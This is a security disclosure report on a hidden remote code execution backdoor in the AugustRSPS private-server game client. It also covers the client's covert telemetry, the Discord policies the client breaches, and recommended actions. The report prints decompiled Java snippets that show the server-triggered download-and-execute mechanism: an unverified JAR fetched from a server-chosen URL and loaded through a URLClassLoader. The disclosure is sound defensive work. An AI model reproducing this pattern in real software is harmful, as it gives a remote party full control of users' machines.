# Security Report — Remote Code Execution backdoor in the AugustRSPS game client

**Status:** confirmed by static analysis (decompilation) of the distributed client.
**Severity:** Critical — unauthenticated, server-triggered remote code execution on every player's computer.
**Reporter context:** independent security review of a game client downloaded to play.

---

## 1. Summary (plain English)

AugustRSPS (an *Old School RuneScape* private server, distributed via **august-rsps.com** and its Discord community) ships a modified RuneLite-based game client. That client contains a **hidden backdoor**: when the **game server sends a specially-crafted chat message**, the client will **download a program (a `.jar`) from any web address the server chooses and run it immediately with full access to the player's computer** — with **no user prompt, no signature check, no allowlist, and over plain unencrypted HTTP**.

In practice this means **whoever controls the server (or anyone able to intercept the player's network traffic) can run arbitrary code on every player's machine** — install malware, steal files/credentials, deploy ransomware, etc. The same plugins also silently stream the player's on-screen activity back to the server.

This affects ordinary players, **including minors**, who cannot see the worst offender (it is marked hidden) and never consent to the code execution.

## 2. What the software is

- **Product:** AugustRSPS custom game client (a fork of the open-source RuneLite client).
- **Distribution:** downloaded from august-rsps.com / linked through the project's Discord server; launched via a bundled launcher.
- **Audited artifact:** `client-237.20260615.jar`
  **SHA-256:** `3055b5ddef6782598a97935bba4de70844bce61d99bcfadd36eb22c200cb3bbc`
- Of 51 bundled jars, 46 were byte-identical to the official RuneLite / Maven Central releases (clean). The malicious code is in the server's **5 custom jars**, specifically four custom plugins.

## 3. The backdoor (technical)

Four custom plugins ship the **same** server-triggered download-and-execute capability. They differ in how visible/active they are by default — see **Appendix A** for the side-by-side. `CobaltPlugin` is the worst case (hidden *and* auto-enabled), so it is the reference below; the other three (`FreezeFramePlugin`, `ModelToolsPlugin`, `ParticlePlugin`) use the identical pattern with a different trigger phrase.

Using `CobaltPlugin` as the reference:

**(a) It is hidden and runs automatically:**
```java
@PluginDescriptor(name = "Cobalt", description = "Client extension.",
                  enabledByDefault = true, hidden = true)
```
`hidden = true` keeps it out of the user-facing plugin list; `enabledByDefault = true` starts it without any action by the player.

**(b) The trigger is a server chat packet:**
```java
@Subscribe public void onChatMessage(ChatMessage event) {
   if (event.getType() == ChatMessageType.ENGINE) {
      if (event.getMessage() != null && event.getMessage().startsWith("Cobalt: ")) {
         ...
         String url = event.getName();   // <-- the server fully controls this URL
```
`ChatMessageType.ENGINE` messages are generated by the game server, not by other players — so this is a covert command channel the server controls.

**(c) It downloads whatever the server points it at — no security checks:**
```java
private File downloadJar(String urlString) throws Exception {
   URL url = new URL(urlString);                 // any scheme/host, incl. plain http://
   File tempFile = File.createTempFile("cobalt-", ".jar");
   InputStream in = url.openStream();            // no TLS requirement, no allowlist
   ... // writes the bytes to a temp .jar (no signature or hash verification)
}
```

**(d) It loads and executes that code in-process, with full privileges:**
```java
private void swapBridgeFromJar(File jarFile) throws Exception {
   this.bridgeClassLoader = new URLClassLoader(
        new URL[]{ jarFile.toURI().toURL() },
        this.getClass().getClassLoader());        // parent = the client itself
   Class<?> implClass = this.bridgeClassLoader.loadClass(
        "net.runelite.client.plugins.augustcustom.cobalt.impl.CobaltBridgeImpl");
   CobaltBridge newBridge = (CobaltBridge) implClass.getDeclaredConstructor().newInstance();
   newBridge.initialize(this.deps());             // arbitrary downloaded code now runs
}
```
The downloaded JAR is loaded with a `URLClassLoader` whose **parent is the client's own classloader**, so the downloaded code runs with the same permissions as the game client (full read/write to the user's files, network, process spawning, etc.). There is **no Authenticode/JAR-signature check, no hash/manifest verification, and no domain allowlist**, and the URL may be plain `http://`, so even a network man-in-the-middle (not just the server) can substitute the payload.

### Attack chain
1. Player launches the AugustRSPS client and logs in (the hidden plugin is already running).
2. The server sends an `ENGINE` chat message beginning with `"Cobalt: "`, with a download URL in the message "name" field.
3. The client downloads the `.jar` from that URL — no prompt, no verification.
4. The client loads and instantiates a class from it → **arbitrary code executes on the player's machine.**

## 4. Surveillance component

The same plugins, when the server toggles a "reporting" flag (`CobaltReportingScript`), continuously transmit the player's UI/activity back to the server via `client.sendIfScriptTrigger(...)`:
- camera yaw/pitch/zoom (`reportCamera`)
- scroll positions of every on-screen panel (`reportScroll`/`scanScrollables`)
- floating-window sizes (`reportFloaterSize`)
- the currently open interface tab (`reportTab`)
- **the full text of any right-click menu the player opens** (`reportMenu` / `buildMenuPayload`)

This is covert client-side telemetry the player is never informed of.

## 5. Why this is dangerous for users

- **Full machine compromise on demand.** A single server-side message can run any code on a player's computer. That is the maximum-impact class of vulnerability (remote code execution).
- **No consent, no visibility.** The plugin is `hidden`, auto-enabled, and prompts the user for nothing.
- **No integrity protection.** No signature, hash, or allowlist — and plain HTTP is accepted — so the payload can be swapped by the server *or* by any attacker on the network path (public Wi-Fi, compromised router, ISP-level MITM).
- **Affects minors.** This client is marketed to and used by children (it is commonly used to "learn English while playing"). They cannot see or evaluate the risk.
- **Realistic worst cases:** credential/cookie/file theft, ransomware, cryptominer install, botnet enrollment, persistent malware — all without the user ever clicking "install."
- **Privacy violation:** continuous covert telemetry of the user's screen interactions.

Even if the operators intended this only as a "remote hot-load/update" convenience for staff, the mechanism as built is indistinguishable from malware and hands complete control of every player's computer to the server — which is a severe, unacceptable risk to users and a violation of platform malware/harm policies.

## 6. Evidence & reproducibility

- **Malicious artifact:** `client-237.20260615.jar`, SHA-256 `3055b5ddef6782598a97935bba4de70844bce61d99bcfadd36eb22c200cb3bbc`.
- **Decompiled source (CFR/Fernflower):** `august-audit/decompiled/client/net/runelite/client/plugins/augustcustom/cobalt/CobaltPlugin.java` and the equivalent `freezeframe/`, `modeltools/`, `particles/` plugins.
- **Confirmed pattern in 4 plugins:** all four declare `@Subscribe onChatMessage` filtering `ChatMessageType.ENGINE`, plus a `downloadJar`-style method feeding a `URLClassLoader`.
- 46/51 bundled jars verified byte-identical to official RuneLite/Maven (rules out a broad supply-chain compromise — the backdoor is specific to the server's custom plugins).
- Independent adversarial re-review confirmed the trigger→download→execute path is reachable and functional.

**Caveat (kept honest):** this analysis proves the *capability* exists in the distributed client. It does not, by itself, prove the operators have executed a malicious payload against a specific user — but the capability is present, unauthenticated, and exploitable, which is itself the harm being reported.

## 7. Which Discord policies this breaches

Distributing and promoting this client through a Discord server violates several of Discord's published policies. (Discord periodically rewords its **Community Guidelines** and **Terms of Service**; the section names/order change, so cite the *current* published version when filing — the mappings below describe the conduct and the provision it falls under.)

1. **Malware & malicious conduct.** Discord's Community Guidelines prohibit using Discord to distribute malware/viruses/malicious code or to otherwise damage, disrupt, or gain unauthorized access to others' devices, accounts, networks, or data. The client's hidden server-triggered "download a JAR from any URL and execute it with full privileges" mechanism (report §3) *is* malware distribution and unauthorized device access. **Primary violation.**
2. **Hacking / unauthorized access & security circumvention.** The Guidelines prohibit content or tooling that enables unauthorized access to, or compromises the security of, other people's systems, accounts, or data. The RCE hands control of every player's machine to the server — or to any network man-in-the-middle, since plain `http://` is accepted with no signature/hash check.
3. **Illegal activity.** The Guidelines prohibit using Discord to plan, promote, or engage in illegal acts. Covertly running code on another person's computer without authorization is a crime under, e.g., the U.S. Computer Fraud and Abuse Act (18 U.S.C. § 1030), the UK Computer Misuse Act 1990, and equivalent computer-misuse laws elsewhere.
4. **Deceptive / fraudulent behavior.** The backdoor plugin is marked `hidden = true` and `enabledByDefault = true` (report §3a) — users are never shown it and never told the client can fetch and run arbitrary code. The Guidelines prohibit deceiving users in ways that cause harm.
5. **Privacy / non-consensual data collection.** The same plugins covertly stream the player's right-click menu text, open interface tab, scroll positions, and window/camera state to the server (report §4). The Guidelines prohibit using Discord to violate others' privacy or to collect/share people's information without their consent.
6. **Terms of Service.** Discord's ToS separately bars using the service for unlawful purposes or to transmit malware/harmful code; hosting the download links and promoting the client through the server breaches that.

**Aggravating context:** the client is used by minors, who cannot evaluate or consent to the risk — relevant to how Discord weighs user-safety harm.

## 8. Recommended actions

- **For users:** stop running the AugustRSPS client; if you have run it, treat the machine as potentially compromised (run a reputable AV scan, change passwords from a clean device).
- **For Discord (Trust & Safety):** the server distributes a client containing a remote-code-execution backdoor targeting end users — a malware/harm-to-users policy violation.
- **For responsible disclosure:** the operators could be notified to remove the hot-load/RCE mechanism, but given it ships enabled-and-hidden to a player base that includes minors, platform reporting is appropriate.

## Appendix A — the backdoor across all four custom plugins

All four declare `@Subscribe onChatMessage`, filter `ChatMessageType.ENGINE`, take the JAR URL from `event.getName()`, download it via `new URL(url).openStream()` (no TLS requirement, no hash/signature check, no allowlist), and execute it via `new URLClassLoader(new URL[]{jar}, getClass().getClassLoader()).loadClass(...).getDeclaredConstructor().newInstance()`. They differ only in visibility, default-enabled state, and trigger phrase:

| Plugin (class) | `hidden` | `enabledByDefault` | `developerPlugin` | Trigger phrase | Download method |
|---|---|---|---|---|---|
| `augustcustom.cobalt.CobaltPlugin` | **true** | **true** | – | `"Cobalt: "` | `downloadJar` |
| `particles.ParticlePlugin` ("Particle Effects") | – | yes (default) | – | `"Particle editor: "` | `downloadEditorJar` |
| `modeltools.ModelToolsPlugin` ("Model Tools") | – | **true** | **true** | `"Model tools:"` | `downloadJar` |
| `freezeframe.FreezeFramePlugin` ("Freeze Frame") | – | false | **true** | `"Freeze frame: "` | `downloadJar` |

**FreezeFramePlugin** (`freezeframe/FreezeFramePlugin.java`)
- `@PluginDescriptor(... developerPlugin = true, enabledByDefault = false)` — the description openly states: *"In production builds, hot-load by sending an ENGINE chat message with text 'Freeze frame: ' and the JAR URL in the message name field."*
- line 218: `if (event.getType() == ChatMessageType.ENGINE)` … 219: `startsWith("Freeze frame: ")` … 220: `String url = event.getName();`
- line 259: `URL url = new URL(urlString);` … 262: `InputStream in = url.openStream();`

### Relative risk (kept honest)
- **Cobalt — highest.** Hidden + enabled-by-default → runs covertly for every player. The egregious one.
- **Particle Effects — high.** Enabled by default and named like a harmless cosmetics plugin → also runs for ordinary players, with the RCE concealed behind a benign-sounding feature.
- **Model Tools / Freeze Frame — conditional.** Both are `developerPlugin = true`; in stock RuneLite, developer plugins load **only** when the client is launched with `--developer-mode`, so they may be inert for normal users. *Unverified* whether August's fork forces developer mode on. Freeze Frame is additionally disabled by default and documents the hot-load in its own description.
- **Intent caveat.** The `developerPlugin` framing and Freeze Frame's documented "hot-load" suggest the operators may treat this as an internal staff dev/update tool rather than a deliberate trap. That mitigates *intent* for those two — but it does **not** reduce the risk of the **Cobalt** and **Particle** variants, which ship **active to ordinary players** with no disclosure, no authentication, and no integrity checks. A "dev convenience" that executes unverified, server-supplied code on end users' machines is still a critical user-safety hazard.
